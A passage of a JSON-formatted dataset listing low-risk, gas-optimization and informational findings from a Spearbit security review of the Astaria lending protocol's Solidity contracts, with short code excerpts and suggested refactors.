liquidities/assets in the public/private vaults would also be at risk.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "ROUTER() can not be updated for private or public vaults", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "ROUTER() is an immutable data for any ClonesWithImmutableArgs.clone that uses AstariaVault- Base. That means for example if there is an issue with the current hardcoded ROUTER() or that it needs to be upgraded, the current public/private vaults would not be able to communicate with the new ROUTER.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Wrong return parameter type is used for getOwed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Both variations of getOwed use _getOwed and return uint192. But _getOwed returns a uint88.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Document and reason about which functionalities should be frozen on protocol pause", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "On protocol pause, a few functions are allowed to be called. Some instances are noted above. There is no documentation on why these functionalities are allowed while the remaining functions are frozen.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Wrong parameter type is used for s.strategyValidators", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "s.strategyValidators is of type mapping(uint32 => address) but the provided TYPE in the con- text is of type uint8.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Some functions do not emit events, but they should", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "AstariaRouter.sol#L268 : Other filing endpoints in the same contract and also CollateralToken and LienToken emit FileUpdated(what, data). But fileGuardian does not.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "setNewGuardian can be changed to a 2 or 3 step transfer of authority process", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The current guardian might pass a wrong _guardian parameter to setNewGuardian which can break the upgradability of the AstariaRouter using fileGuardian.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "There are no range/value checks when some parameters get fileed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "There are no range/value checks when some parameters get fileed. For example:  There are no hardcoded range checks for the ...Numerators and ...Denominators, so that the protocol's users can trustlessly assume the authorized users would not push these values into ranges seemed unac- ceptable.  When an address get updated, we don't check whether the value provided is address(0) or not.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Manually constructed storage slots can be chosen so that the pre-image of the hash is unknown", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In the codebase, some storage slots are manually constructed using keccak256 hash of a string xyz.astaria. .... The pre-images of these hashes are known. This can allow in future for actors to find a potential path to those storage slots using the keccak256 hash function in the codebase and some crafted payload.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Avoid shadowing variables", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The highlighted line declares a new variable owner which has already been defined in Auth.sol inherited by LienToken: address owner = ownerOf(lienId);", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "PublicVault.accrue is manually inlined rather than called", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The _accrue function locks in the implied value of the PublicVault by calculating, then adding to yIntercept, and finally emitting an event. This calculation is duplicated in 3 separate locations in PublicVault:  In totalAssets  In _accrue  And in updateVaultAfterLiquidation", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "CollateralToken.flashAction reverts with incorrect error", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Reverts with InvalidCollateralStates.AUCTION_ACTIVE when the address is not flashEnabled.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "AstariaRouter has unnecessary access to setPayee", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "LienToken.setPayee. setPayee is never called from AstariaRouter, but the router has access to call", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "ClearingHouse can be deployed only when needed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "When collateral is deposited, a Clearing House is automatically deployed. However, these Clearing Houses are only needed if the collateral goes to auction at Seaport, either through liquidation or the collateral holder choosing to sell them. The Astaria team has indicated that this behavior is intentional in order to put the cost on the borrower, since liquidations are already expensive. I'd suggest the perspective that all pieces of collateral will be added to the system, but a much smaller percentage will ever be sent to Seaport. The aggregate gas spent will be much, much lower if we are careful to only deploy these contract as needed. Further, let's look at the two situations where we may need a Clearing House: 1) The collateral holder calls listForSaleOnSeaport(): In this case, the borrower is paying anyways, so it's a no brainer. 2) Another user calls liquidate(): In this case, they will earn the liquidation fees, which should be sufficient to justify a small increase in gas costs.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "PublicVault.claim() can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "For claim not to revert we would need to have msg.sender == owner(). And so when the following is called: _mint(owner(), unclaimed); Instead of owner() we can use msg.sender since reading the immutable owner() requires some calldata lookup.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Can remove incoming terms from LienActionBuyout struct", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Incoming terms are never used in the LienActionBuyout struct. The general flow right now is:  incomingTerms are passed to VaultImplementation#buyoutLien.  These incoming terms are validated and used to generate the lien information.  The lien information is encoded into a LienActionBuyout struct.  This is passed to LienToken#buyoutLien, but then the incoming terms are never used again.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Refactor updateVaultAfterLiquidation to save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In updateVaultAfterLiquidation, we check if we're within maxAuctionWindow of the end of the If we are, we call _deployWithdrawProxyIfNotDeployed and assign withdrawProxyIfNearBoundary to epoch. the result. We then proceed to check if withdrawProxyIfNearBoundary is assigned and, if it is, call handleNewLiquidation. Instead of checking separately, we can include this call within the block of code executed if we're within maxAuc- tionWindow of the end of the epoch. This is true because (a) withdraw proxy will always be deployed by the end of that block and (b) withdraw proxy will never be deployed if timeToEnd >= maxAuctionWindow.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Use collateralId to set collateralIdToAuction mapping", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "_listUnderlyingOnSeaport() sets collateralIdToAuction mapping as follows: s.collateralIdToAuction[uint256(listingOrder.parameters.zoneHash)] = true; Since this function has access to collateralId, it can be used instead of using zoneHash.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Storage packing", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "RouterStorage: The RouterStorage struct represents state managed in storage by the AstariaRouter contract. Some of the packing in this struct is sub optimal. 1. maxInterestRate and minInterestBPS: These two values pack into a single storage slot, however, are never referenced together outside of the constructor. This means, when read from storage, there are no gas efficiencies gained. 2. Comments denoting storage slots do not match implementation. The comment //slot 3 + for example occurs far after the 3rd slot begins as the addresses do not pack together. LienStorage: 3. The LienStorage struct packs maxLiens with the WETH address into a single storage slot. While gas is saved on the constructor, extra gas is spent in parsing maxLiens on each read as it is read alone. VaultData: 4. VaultData packs currentEpoch into the struct's first slot, however, it is more commonly read along with values from the struct's second slot.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "ClearingHouse fallback can save WETH address to memory to save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The fallback function reads WETH() from ROUTER three times. once and save to memory for the future calls.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "CollateralToken's onlyOwner modifier doesn't need to access storage", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The onlyOwner modifier calls to ownerOf(), which loads storage itself to check ownership. We can save a storage load since we don't need to load the storage variables in the modifier itself.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Can stop loop early in _payDebt when everything is spent", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "When a loan is sold on Seaport and _payDebt is called, it loops through the auction stack and calls _paymentAH for each, decrementing the remaining payment as money is spent. This loop can be ended when payment == 0.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Can remove initializing allowList and depositCap for private vaults", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Private Vaults do not allow enabling, disabling, or editing the allow list, and don't enforce a deposit cap, so seems strange to initialize these variables. Delegates are still included in the _validateCommitment function, so we can't get rid of this entirely.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "ISecurityHook.getState can be modified to return bytes32 / hash of the state instead of the state itself.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Since only the keccak256 of preTransferState is checked against the kec- cak256 hash of the returned security hook state, we could change the design so that ISecurityHook.getState returns bytes32 to save gas. Unless there is a plan to use the bytes memory preTransferState in some other form as well.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Define an endpoint for LienToken that only returns the liquidator", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "It would save a lot of gas if LienToken had an endpoint that would only return the liquidator for a collateralId, instead of all the auction data.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Setting uninitialized stack variables to their default value can be avoided.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Setting uninitialized stack variables to their default value adds extra gas overhead. T t = <DEFAULT_VALUE>;", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Simplify / optimize for loops", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In the codebase, sometimes there are for loops of the form: for (uint256 i = 0; <CONDITION>; i++) { <BODY> } These for loops can be optimized.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "calculateSlope can be more simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "calculateSlope can be more simplified: owedAtEnd would be: owedAtEnd = amt + (tend (cid:0) tlast )r amt 1018 where:  amt is stack.point.amount  tend is stack.point.end  tlast is stack.point.last  r is stack.lien.details.rate and so the returned value would need to be r amt 1018.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Break out of _makePayment for loop early when totalCapitalAvailable reaches 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In _makePayment we have the following for loop: for (uint256 i; i < n; ) { (newStack, spent) = _payment( s, stack, uint8(i), totalCapitalAvailable, address(msg.sender) ); totalCapitalAvailable -= spent; unchecked { ++i; } } When totalCapitalAvailable reaches 0 we still call _payment which costs a lot of gas and it is only used for transferring 0 assets, removing and adding the same slope for a lien owner if it is a public vault and other noops.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "_buyoutLien can be optimized by reusing payee", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "payee in _buyoutLien can be reused to save some gas", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "isValidRefinance and related storage parameters can be moved to LienToken", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "isValidRefinance is only used in LienToken and with the current implementation it requires reading AstariaRouter from the storage and performing a cross-contract call which would add a lot of overhead gas cost.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "auctionWindowMax can be reused to optimize liquidate", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "There are mutiple instances of s.auctionWindow + s.auctionWindowBuffer in the liquidate func- tion which would make the function to read from the storage twice each time. Also there is already a stack variable auctionWindowMax defined as the sum which can be reused.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "fileBatch() does requiresAuth for each file separately", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "fileBatch() does a requiresAuth check and then for each element in the input array calls file() which does another requiresAuth check. function fileBatch(File[] calldata files) external requiresAuth { for (uint256 i = 0; i < files.length; i++) { file(files[i]); } } ... function file(File calldata incoming) public requiresAuth { This wastes gas as if the fileBatch()'s requiresAuth pass, file()'s check will pass too.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "_sliceUint can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "_sliceUint can be optimized", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Use basis points for ratios", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Fee ratios are represented through two state variables for numerator and denominator. Basis point system can be used in its place as it is simpler (denominator always set to 10_000), and gas efficient as denomi- nator is now a constant.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "No Need to Allocate Unused Variable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "LienToken._makePayment() returns two values: (Stack[] memory newStack, uint256 spent), but the second value is never read: (newStack, ) = _makePayment(_loadLienStorageSlot(), stack, amount); Also, if this value is planned to be used in future, it's not a useful value. It is equal to the payment made to the last lien. A more meaningful quantity can be the total payment made to the entire stack. Additional instances noted in Context above.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Cache Values to Save Gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Calls are occurring, same values are computed, or storage variables are being read, multiple times; e.g. CollateralToken.sol#L286-L307 reads the storage variable s.securityHooks[addr] four times. It's better to cache the result in a stack variable to save gas.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "RouterStorage.vaults can be a boolean mapping", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "RouterStorage.vaults is of type mapping(address => address). A key-value is stored in the mapping as: s.vaults[vaultAddr] = msg.sender; However, values in this mapping are only used to compare against address(0): if (_loadRouterSlot().vaults[msg.sender] == address(0)) { ... return _loadRouterSlot().vaults[vault] != address(0); It's better to have vaults as a boolean mapping as the assignment of msg.sender as value doesn't carry a special meaning.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "isValidReference() should just take an array element as input", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "stack[position]: isValidRefinance() takes stack array as an argument but only uses stack[0] and function isValidRefinance( ILienToken.Lien calldata newLien, uint8 position, ILienToken.Stack[] calldata stack ) public view returns (bool) { The usage of stack[0] can be replaced with stack[position] as stack[0].lien.collateralId == stack[position].lien.collateralId: if (newLien.collateralId != stack[0].lien.collateralId) { revert InvalidRefinanceCollateral(newLien.collateralId); } To save gas, it can directly take that one element as input.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Functions can be made external", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "If public function is not called from within the contract, it should made external for clarity, and can potentially save gas.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "a.mulDivDown(b,1) is equivalent to a*b", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Highlighted code above follow the pattern of a.mulDivDown(b, 1) which is equivalent to a*b.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Use scratch space for keccak", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "computeId() function computes and returns uint256(keccak256(abi.encodePacked(token, to- kenId))). Since the data being hashed fits within 2 memory slots, scratch space can be used to avoid paying gas cost on memory expansion.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Define a named constant for the return value of onFlashAction", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "onFlashAction returns: keccak256(\"FlashAction.onFlashAction\")", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Define a named constant for permit typehash in ERC20-cloned", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In permit, the following type hash has been used: keccak256( \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\" )", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Unused struct, enum and storage fields can be removed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The struct, enum and storage fields in this context have not been used in the project.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "WPStorage.expected's comment can be made more accurate", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In WPStorage's definition we have: uint88 expected; // Expected value of auctioned NFTs. yIntercept (virtual assets) of a PublicVault are ,! not modified on liquidation, only once an auction is completed. The comment for expected is not exactly accurate. The accumulated value in expected is the sum of all auctioned NFTs's amountOwed when (the timestamp) the liquidate function gets called. Whereas the NFTs get auctioned starting from their first stack's element's liquidationInitialAsk to 1_000 wei", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Leave comment that in WithdrawProxy.claim() the calculation of balance cannot underflow", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "There is this following line in claim() where balance is initialised: uint256 balance = ERC20(asset()).balanceOf(address(this)) - s.withdrawReserveReceived; With the current PublicVault implementation of IPublicVault, this cannot underflow since the increase in with- drawReserveReceived (using increaseWithdrawReserveReceived) is synced with increasing the asset balance by the same amount.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Shared logic in withdraw and redeem functions of WithdrawProxy can be turned into a shared modifier", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "withdraw and redeem both start with the following lines: WPStorage storage s = _loadSlot(); // If auction funds have been collected to the WithdrawProxy // but the PublicVault hasn't claimed its share, too much money will be sent to LPs if (s.finalAuctionEnd != 0) { // if finalAuctionEnd is 0, no auctions were added revert InvalidState(InvalidStates.NOT_CLAIMED); } Since they have this shared logic at the beginning of their body, we can consolidate the logic into a modifier.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "StrategyDetails version can only be used in custom implementation of IStrategyValidator, requires documentation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "StrategyDetails.version is never used in the current implementations of the validators.  If the intention is to avoid replays across different versions of Astaria, we should add a check for it in commit- ment validation functions.  A custom implementation of IStrategyValidator can make use of this value, but this needs documentation as to exactly what it refers to.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Define helper functions to tag different pieces of cloned data for ClearingHouse", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "_getArgAddress(0) and _getArgUint256(21) are used as the ROUTER() and COLLATERAL_ID() in the fallback implementation for ClearingHouse was Clone derived contract.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "A new modifier onlyVault() can be defined for WithdrawProxy to consolidate logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The following require statement has been used in multiple functions including increaseWith- drawReserveReceived, drain, setWithdrawRatio and handleNewLiquidation. require(msg.sender == VAULT(), \"only vault can call\");", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Inconsistant pragma versions and floating pragma versions can be avoided", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Most contracts in the project use pragma solidity 0.8.17, but there are other variants as well: 69 pragma solidity ^0.8.16; pragma solidity ^0.8.16; pragma solidity ^0.8.16; // src/Interfaces/IAstariaVaultBase.sol // src/Interfaces/IERC4626Base.sol // src/Interfaces/ITokenBase.sol pragma solidity ^0.8.15; // src/Interfaces/ICollateralToken.sol pragma solidity ^0.8.0; pragma solidity ^0.8.0; pragma solidity ^0.8.0; pragma solidity ^0.8.0; pragma solidity ^0.8.0; pragma solidity ^0.8.0; // src/Interfaces/IERC20.sol // src/Interfaces/IERC165.sol // src/Interfaces/IERC1155.sol // src/Interfaces/IERC1155Receiver.sol // src/Interfaces/IERC721Receiver.sol // src/utils/Math.sol pragma solidity >=0.8.0; pragma solidity >=0.8.0; // src/Interfaces/IERC721.sol // src/utils/MerkleProofLib.sol And they all have floating version pragmas.  In hardhat.config.ts, solidity: \"0.8.13\" is used.  In .prettierrc settings we have \"compiler\": \"0.8.17\"  In .solhint.json we have \"compiler-version\": [\"error\", \"0.8.0\"]  foundry.toml does not have a solc setting", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "IBeacon is missing a compiler version pragma", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "IBeacon is missing a compiler version pragma.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "zone and zoneHash are not required for fully open Seaport orders", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "As per Seaport's documentation,zone and zoneHash are not required for PUBLIC orders: The zone of the order is an optional secondary account attached to the order with two additional privi- leges:  The zone may cancel orders where it is named as the zone by calling cancel. (Note that offerers can also cancel their own orders, either individually or for all orders signed with their current counter at once by calling incrementCounter).  \"Restricted\" orders (as specified by the order type) must either be executed by the zone or the offerer, or must be approved as indicated by a call to an isValidOrder or isValidOrderIncludingEx- traData view function on the zone. 70 This order isn't \"Restricted\", and there is no way to cancel a Seaport order once created from this contract.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Inconsistent treatment of delegate setting", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Private vaults include delegate in the allow list when deployed through the Router. Public vaults do not. The VaultImplementation, when mutating a delegate, sets them on allow list.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "AstariaRouter does not adhere to EIP1967 spec", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The Router serves as an implementation Beacon for proxy contracts, however, does not adhere to the EIP1967 spec.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Receiver of bought out lien must be approved by msg.sender", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The buyoutLien function requires that either the receiver of the lien is msg.sender or is an address approved by msg.sender: if (msg.sender != params.encumber.receiver) { require( _loadERC721Slot().isApprovedForAll[msg.sender][params.encumber.receiver] ); } This check seems unnecessary and in some cases will block users from buying out liens as intended.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "A new modifer onlyLienToken() can be defined to refactor logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The following require statement has been used in multiple locations in PublicVault: require(msg.sender == address(LIEN_TOKEN())); Locations used:  beforePayment  afterPayment  handleBuyoutLien  updateAfterLiquidationPayment  updateVaultAfterLiquidation", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "A redundant if block can be removed from PublicVault._afterCommitToLien", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In PublicVault._afterCommitToLien, we have the following if block: if (s.last == 0) { s.last = block.timestamp.safeCastTo40(); } This if block is redundant, since regardless of the value of s.last, a few lines before _accrue(s) would update the s.last to the current timestamp.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Private vaults' deposit endpoints can be potentially simplifed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "A private vault's deposit function can be called directly or indirectly using the ROUTER() (either way by anyone) and we have the following require statement: require( s.allowList[msg.sender] || (msg.sender == address(ROUTER()) && s.allowList[receiver]) ); If the ROUTER() is the AstariaRouter implementation of IAstariaRouter, then it inherits from ERC4626RouterBase and ERC4626Router which allows anyone to call into deposit of this private vault using:  depositToVault  depositMax  ERC4626RouterBase.deposit Thus if anyone of the above functions is called through the ROUTER(), msg.sender == address(ROUTER() will be true. Also, note that when private vaults are created using the newVault the msg.sender/owner along the delegate are added to the allowList and allowlist is enabled. And since there is no bookkeeping here for the receiver, except only the require statement, that means  Only the owner or the delegate of this private vault can call directly into deposit or  Anyone else can set the address to parameter of one of those 3 endpoints above to owner or delegate to deposit assets (wETH in the current implementation) into the private vault. And all the assets can be withdrawn by the owner only.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "The require statement in decreaseEpochLienCount can be more strict", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "decreaseEpochLienCount has the following require statement that limits who can call into it: require( msg.sender == address(ROUTER()) || msg.sender == address(LIEN_TOKEN()) ); So only, the ROUTER() and LIEN_TOKEN() are allowed to call into. But AstariaRouter never calls into this function.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "amount is not used in _afterCommitToLien", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "amount is not used in _afterCommitToLien to update/decrement s.yIntercept, because even though assets have been transferred out of the vault, they would still need to be paid back and so the net ef- fect on s.yIntercept (that is used in the calculation of the total virtual assets) is 0.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Use modifier", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Highlighted code have require checks on msg.sender which can be converted to modifiers. For instance: require(address(msg.sender) == s.guardian);", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Prefer SafeCastLib for typecasting", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Highlighted code above does typecasting of several constant values. In case, some value doesn't fit in the type, this typecasting will silently ignore the higher order bits although that's currently not the case, but it may pose a risk if these values are changed in future.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Rename Multicall to Multidelegatecall", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Multicall.sol lets performs multiple delegatecalls. Hence, the name Multicall is not suitable. The contract and the file should be named Multidelegatecall.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "safeTransferFrom() without the data argument can be used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Highlighted code above sends empty data over an external call via ERC721.safeTransferFrom(from, to, tokenId, data): IERC721(underlyingAsset).safeTransferFrom( address(this), releaseTo, assetId, \"\" ); data can be removed since ERC721.safeTransferFrom(from, to, tokenId) sets empty data too.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Fix documentation that updateVaultAfterLiquidation can be called by LIEN_TOKEN, not ROUTER", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The function has the correct validation that it can only be called by LIEN_TOKEN(), but the comment says it can only be called by ROUTER(). require(msg.sender == address(LIEN_TOKEN())); // can only be called by router", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Declare event and constants at the beginning", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Events and constants are generally declared at the beginning of a smart contract. However, for the highlighted code above, that's not the case.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Rename Vault to PrivateVault", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Vault contract is used to represent private vaults.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Remove comment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Comment at line WithdrawProxy.sol#L229 can be removed: if ( block.timestamp < 